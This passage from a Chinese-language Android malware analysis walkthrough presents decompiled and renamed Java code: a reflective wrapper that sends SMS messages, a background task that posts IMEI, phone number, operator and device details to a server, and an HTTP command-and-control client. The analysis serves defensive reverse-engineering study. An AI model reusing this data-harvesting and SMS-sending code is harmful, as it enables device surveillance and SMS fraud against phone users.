            Object invoke = cls.getMethod("getDefault", new Class[0]).invoke(null, new Object[0]);
            Method method = cls.getMethod(new StringBuilder("send").append(StringDatabase.TextMessage).toString(), new Class[]{String.class, String.class, String.class, PendingIntent.class, PendingIntent.class});
            Object[] objArr = new Object[5];
            objArr[0] = str;
            objArr[2] = str2;
            method.invoke(invoke, objArr);
        } catch (Exception e) {
        }
        return false;
    }
调用的函数来自android.telephony.SmsManager，命名为sendTextMessage。我们快速浏览SmsManager类的Android开发者页面，可以找到以下信息：
    public void sendTextMessage (String destinationAddress, 
                    String scAddress, 
                    String text, 
                    PendingIntent sentIntent, 
                    PendingIntent deliveryIntent)
其中，变量str和str2是方法的第一个和第三个参数。第一个参数是destinationAddress，第三个参数是短信息的文本。该函数使用指定正文，将文本消息发送到指定号码。经过重新编写后的方法如下：
    public static boolean sendSms(String destinationAddress, String text) {
        try {
            Class SmsManager = Class.forName(StringDatabase.android + ".telephony.SmsManager");
            Object methodGetDefaultSmsManager = SmsManager.getMethod("getDefault", new Class[0]).invoke(null, new Object[0]);
            Method methodSendTextMessage = SmsManager.getMethod(new StringBuilder("send").append(StringDatabase.TextMessage).toString(), new Class[]{String.class, String.class, String.class, PendingIntent.class, PendingIntent.class});
            Object[] objectArray = new Object[5];
            objectArray[0] = destinationAddress;
            objectArray[2] = text;
            methodSendTextMessage.invoke(methodGetDefaultSmsManager, objectArray);
        } catch (Exception e) {
        }
        return false;
    }
在这个类中，包装了TelephonyManager，这也就是为什么我们将其重命名为TelephonyManagerWrapper的原因。
###  6.7 类i
这个类是AsyncTask，意味着它会在应用程序的后台运行。AsyncTask的生命周期有四个阶段：
1、onPreExecute，用于准备稍后使用的类中的任意内容。
2、doInBackground，这是任务的主要部分。
3、onProgressUpdate，用于更新UI。此方法通常在恶意软件中被删去，因为任务需要保持隐藏状态。
4、onPostExecute，在doInBackground函数完成后执行。
doInBackground方法被正确反编译，但onPostExecute方法无法使用JAD-X、JD-CMD、Fernflower、CFR或包含使用dex2jar制作的JAR的Procyon进行反编译。如果使用enjarify来生成JAR，结果与之前相同。在后面，我们会详细介绍onPostExecute函数。
6.7.1 doInBackground
doInBackground函数如下所示。为了完全理解它的作用，我们首先需要分析类t。
    protected final Object doInBackground(Object[] objArr) {
        Object obj = null;
        boolean z = true;
        boolean z2 = MainService.e;
        String str = ((String[]) objArr)[StringDatabase.integerFalse];
        t tVar = new t();
        this.e.add(new BasicNameValuePair("method", this.r));
        this.e.add(new BasicNameValuePair("id", this.sharedPreferences.getString("id", null)));
        if (this.r.startsWith("install")) {
            String str2 = "POST";
            this.e.add(new BasicNameValuePair("operator", TelephonyManagerWrapper.getTelephonyManager(context).getNetworkOperatorName()));
            this.e.add(new BasicNameValuePair("model", Build.MODEL));
            this.e.add(new BasicNameValuePair("os", VERSION.RELEASE));
            this.e.add(new BasicNameValuePair("phone", TelephonyManagerWrapper.getTelephonyManager(context).getLine1Number()));
            this.e.add(new BasicNameValuePair("imei", TelephonyManagerWrapper.getTelephonyManager(context).getDeviceId()));
            this.e.add(new BasicNameValuePair("version", s.w));
            this.e.add(new BasicNameValuePair("country", context.getResources().getConfiguration().locale.getCountry()));
            obj = t.q(str, "POST", this.e);
        } else if (this.r.startsWith("info")) {
            obj = t.q(str, "POST", this.e);
        } else if (this.r.startsWith("sms")) {
            obj = t.q(str, "POST", this.e);
        }
        if (StringDatabase.integerZero != 0) {
            if (z2) {
                z = false;
            }
            MainService.e = z;
        }
        return obj;
    }
在分析t之后，我们会给出新版本的doInBackground函数，并对该类进行详细分析。
###  6.8 类t
类t中的函数q将在下面给出。需要注意的是，其中的某些变量已根据其类型来重新命名。下面将会进一步解释其中的变化。
    public static JSONObject q(String url, String var1, List var2) {
        boolean var10001;
        label66:
        {
            DefaultHttpClient defaultHttpClient;
            try {
                if (var1 == "POST") {
                    defaultHttpClient = new DefaultHttpClient();
                    HttpPost httpPost = new HttpPost(url);
                    UrlEncodedFormEntity urlEncodedFormEntity = new UrlEncodedFormEntity(var2, "UTF-8");
                    httpPost.setEntity(urlEncodedFormEntity);
                    inputStream = defaultHttpClient.execute(httpPost).getEntity().getContent();
                    break label66;
                }
            } catch (Throwable var12) {
                var10001 = false;
                break label66;
            }
            try {
                if (var1 == "GET") {
                    defaultHttpClient = new DefaultHttpClient();
                    String formattedUrlUtils = URLEncodedUtils.format(var2, "utf-8");
                    StringBuilder var3 = new StringBuilder(String.valueOf(url));
                    HttpGet httpGet = new HttpGet(var3.append("?").append(formattedUrlUtils).toString());
                    inputStream = defaultHttpClient.execute(httpGet).getEntity().getContent();
                }
            } catch (Throwable var11) {
                var10001 = false;
            }
        }
        label55:
        {
            BufferedReader var14;
            StringBuilder var20;
            try {
                InputStreamReader var18 = new InputStreamReader(inputStream, "iso-8859-1");
                var14 = new BufferedReader(var18, 8);
                var20 = new StringBuilder();
            } catch (Throwable var10) {
                var10001 = false;
                break label55;
            }
            while (true) {
                try {
                    var1 = var14.readLine();
                } catch (Throwable var8) {
                    var10001 = false;
                    break;
                }
                if (var1 == null) {
                    try {
                        inputStream.close();
                        w = var20.toString();
                        break;
                    } catch (Throwable var7) {
                        Throwable var15 = var7;
                        try {
                            throw var15;
                        } catch (Throwable var6) {
                            var10001 = false;
                            break;
                        }
                    }
                }
                try {
                    var20.append(var1).append("n");
                } catch (Throwable var9) {
                    var10001 = false;
                    break;
                }
            }
        }
        try {
            JSONObject var16 = new JSONObject(w);
            jsonObject = var16;
        } catch (Throwable var5) {
        }
        return jsonObject;
    }
这个函数中有三个参数，第一个是URL，可以在HTTP
POST构造函数中看到（需要一个URL）。然后使用编码后的参数附加URL，以避免在接收端出现错误。提供的方法是可以从if语句中派生的第二个参数，然后比较给定的字符串是GET还是POST。第三个参数是真正意义上的参数，它会被编码并附加到URL。服务器的响应将作为JSONObject返回。修改后的该方法如下：
    public static JSONObject callC2(String url, String httpMethod, List parameters) {
        boolean var10001;
        label66:
        {
            DefaultHttpClient httpClient;
            try {
                if (httpMethod == "POST") {
                    httpClient = new DefaultHttpClient();
                    HttpPost httpPost = new HttpPost(url);
                    UrlEncodedFormEntity urlEncodedFormEntity = new UrlEncodedFormEntity(parameters, "UTF-8");
                    httpPost.setEntity(urlEncodedFormEntity);
                    inputStream = httpClient.execute(httpPost).getEntity().getContent();
                    break label66;
                }
            } catch (Throwable throwable) {
                var10001 = false;
                break label66;
            }
            try {
                if (httpMethod == "GET") {
                    httpClient = new DefaultHttpClient();
                    String encodedParameters = URLEncodedUtils.format(parameters, "utf-8");
                    StringBuilder urlBuilder = new StringBuilder(String.valueOf(urlBuilder));
                    HttpGet httpGet = new HttpGet(urlBuilder.append("?").append(encodedParameters).toString());
                    inputStream = httpClient.execute(httpGet).getEntity().getContent();
                }
            } catch (Throwable throwable) {
                var10001 = false;
            }
        }
        label55:
        {
            BufferedReader bufferedReader;
            StringBuilder stringBuilder;
            try {
                InputStreamReader inputStreamReader = new InputStreamReader(inputStream, "iso-8859-1");
                bufferedReader = new BufferedReader(inputStreamReader, 8);
                stringBuilder = new StringBuilder();
            } catch (Throwable var10) {
                var10001 = false;
                break label55;
            }
            while (true) {
                try {
                    httpMethod = bufferedReader.readLine();
                } catch (Throwable throwable) {
                    var10001 = false;
                    break;
                }
                if (httpMethod == null) {
                    try {
                        inputStream.close();
                        serverResponseRaw = stringBuilder.toString();
                        break;
                    } catch (Throwable throwable) {
                        Throwable throwable2 = throwable;
                        try {
                            throw throwable2;
                        } catch (Throwable throwable1) {
                            var10001 = false;
                            break;
                        }
                    }
                }
                try {
                    stringBuilder.append(httpMethod).append("n");
                } catch (Throwable throwable) {
                    var10001 = false;
                    break;
                }
            }
        }
        try {
            JSONObject serverResonseJson = new JSONObject(serverResponseRaw);
            ServerCommunicator.serverResponseJson = serverResonseJson;
        } catch (Throwable throwable) {
        }
        return serverResponseJson;
    }
根据callC2函数，我们可以将这个类重命名为ServerCommunicator。
## 小结
至此，我们已经对manifest和源代码中的重要函数和类进行了初步分析。通过初步分析，我们已经大致了解了恶意软件中的部分功能。但是，如我们前文所说，对样本分析的过程就犹如拼一块巨型拼图的过程。在对前面的函数和类进行分析后，如果回过头看某些重要的类，会得出什么不同的结论呢？此外，随着分析的不断深入，我们是否能寻找到恶意软件的核心功能？请在下一篇中寻找答案。